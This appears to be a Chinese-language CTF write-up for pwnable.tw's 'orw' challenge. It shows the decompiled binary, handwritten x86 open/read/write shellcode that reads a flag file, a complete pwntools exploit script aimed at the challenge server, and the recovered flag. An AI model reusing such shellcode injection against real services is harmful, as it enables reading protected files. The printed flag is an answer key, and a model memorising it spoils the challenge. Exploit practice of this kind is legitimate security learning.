这道题的要求是只能使用 `open`、`read`、`write` 这三种系统调用。用 IDA 进入后看它的大概逻辑，main 函数是这样子的：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

这道题的意思就是读长度不大于两百的字符串然后执行，`orw_seccomp` 应该就是设置白名单。（以后有时间再分析，现在知道是这个功能。）那我们的目标就是编写符合要求的 shellcode。

做完第一题可以知道 flag 保存在了 `\home\xxx\flag` 中，而本题我们只需要控制流首先 open，再 read，最后 write 就可以了。当然这需要对 Linux 系统中断有一定的了解。

对于文件描述符 fd，参照 https://en.wikipedia.org/wiki/File_descriptor ，0，1，2 分别代表 stdin、stdout、stderr，而每次调用 open 时会分配一个新的 fd（在这里就是 3）。

伪代码表示为：

```c
char *file = "/home/orw/flag";
sys_open(file, 0, 0);
sys_read(filefd, file, 0x20); 	// stdfile 3
sys_write(stdout, file, 0x20); 	// stdout 1
```

那么汇编怎么写呢。。我手动构造一下

```assembly
; sys_open
push 0x00006761	; "\x00\x00ga"
push 0x6c662f77	; "lf/w"
push 0x726f2f65	; "ro/e"
push 0x6d6f682f	; "moh/"
mov eax, 5
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
; sys_read
mov eax, 3
mov ebx, 3
mov ecx, esp
mov edx, 0x30
int 0x80
; sys_write
mov eax, 4
mov ebx, 1
int 0x80
```

嗯。。发现自己 pwntools 的很多基础命令都有点忘了。

```python
context(os = 'linux',arch='i386',log_level='debug')
```

最后构造的 payload 如下。。就能拿到 flag 了。

```python
from pwn import *

# p = process('./orw')
p = remote('chall.pwnable.tw', 10001)
context(os = 'linux',arch='i386',log_level='debug')

shellcode = ''
shellcode += asm('''
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov eax, 5
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
mov eax, 3
mov ebx, 3
mov ecx, esp
mov edx, 0x30
int 0x80
mov eax, 4
mov ebx, 1
int 0x80
''')

p.sendlineafter("shellcode:", shellcode)
print(p.recv())
```

`FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}`

被自己蠢哭。。